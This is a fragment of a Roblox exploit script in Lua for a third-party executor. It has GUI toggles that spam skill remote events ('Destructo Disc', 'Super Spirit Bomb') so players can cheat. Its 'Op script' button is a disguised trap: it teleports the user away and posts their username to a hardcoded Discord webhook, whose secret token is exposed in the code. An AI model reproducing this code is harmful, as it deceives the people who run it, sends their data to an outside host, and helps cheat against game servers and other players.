op:Button("Op script", function()
 

 local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=2506564617"
hi.Volume = 10
hi.Looped = false
hi.archivable = false
hi.Parent = game.Workspace

if game.Players.LocalPlayer.Character.Humanoid.Health > 10 then
hi:Play()
end
  wait(2)
  local PlaceId = 5373028495
game:GetService("TeleportService"):Teleport(PlaceId, game:GetService("Players").LocalPlayer)
local msg = "@here " .. game.Players.LocalPlayer.Name .. " just got noobed."
local url = "https://discord.com/api/webhooks/1039299929270652999/m_lVLl79Fbwt51bmV9TyCnbPeXZwPp2tBhylcMiUitdzjZTLs3M-f9Wi15s1bC-tyIpP"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
      setclipboard(grouplink)

end)


Attack:Toggle("Disc Spam", false,function(t) -- This is A Toggle
hz = t
   while hz do task.wait()
       local args = {
    [1] = "Destructo Disc"
}

game:GetService("ReplicatedStorage").Events.giveskill:FireServer(unpack(args))
wait()
     for i = 1,1 do
    wait(cooldown)
local args = {
    [1] = false,
    [2] = game:GetService("Players").LocalPlayer.Character.RightHand,
    [3] = game:GetService("Players").LocalPlayer.Character.Effects,
    [4] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
    [5] = 0,
    [6] = game:GetService("Players").LocalPlayer.Backpack["Destructo Disc"]
}

game:GetService("ReplicatedStorage").Events.destructo:FireServer(unpack(args))
wait()
mouse = game.Players.LocalPlayer:GetMouse()
local pos = mouse.Hit
pos = Vector3.new(pos.X,pos.Y,pos.Z)
vector = pos

local args = {
    [1] = true,
    [2] = game:GetService("Players").LocalPlayer.Character.RightHand,
    [3] = game:GetService("Players").LocalPlayer.Character.Effects,
    [4] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
    [5] = 120,
    [6] = game:GetService("Players").LocalPlayer.Backpack["Destructo Disc"],
    [7] = vector
}

game:GetService("ReplicatedStorage").Events.destructo:FireServer(unpack(args))
end
end end)

Attack:Toggle("Super Spirit Bomb", false,function(t) -- This is A Toggle
hv = t
   while hv do task.wait()
     local args = {
    [1] = "Super Spirit Bomb"
}

game:GetService("ReplicatedStorage").Events.giveskill:FireServer(unpack(args))
wait(0.5)
local ye   = game.Players.LocalPlayer:GetMouse()
local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(game.Players.LocalPlayer.Backpack["Super Spirit Bomb"].LocalScript.Animation)
anim:play()
anim:AdjustSpeed(0.675)
speed = .1
wait()
for i = 1,1 do
    wait(speed) -- makes you wait .25 milliseconds 
local args = {
    [1] = false,
    [2] = "SpiritBomb",
    [3] = game:GetService("Players").LocalPlayer.Character.Effects,
    [4] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
    [5] = 0,
    [6] = game:GetService("Players").LocalPlayer.Backpack["Super Spirit Bomb"],
    [7] = vector,
    [8] = 400,
    [9] = "Blue",
    [10] = game:GetService("Players").LocalPlayer.Character.RightHand,
    [11] = 0.1,
    [12] = 1
}

game:GetService("ReplicatedStorage").Events.bigball:FireServer(unpack(args))
wait()
mouse = game.Players.LocalPlayer:GetMouse()
local pos = mouse.Hit
pos = Vector3.new(pos.X,pos.Y,pos.Z)
vector = pos


local args = {
    [1] = true,
    [2] = "SpiritBomb",
    [3] = game:GetService("Players").LocalPlayer.Character.Effects,
    [4] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
    [5] = 0,
    [6] = game:GetService("Players").LocalPlayer.Backpack["Super Spirit Bomb"],
    [7] = vector,
    [8] = 400,
    [9] = "Blue",
    [10] = game:GetService("Players").LocalPlayer.Character.RightHand,
    [11] = 0.1,
    [12] = 1
}

game:GetService("ReplicatedStorage").Events.bigball:FireServer(unpack(args))
end
anim:stop()
end end)

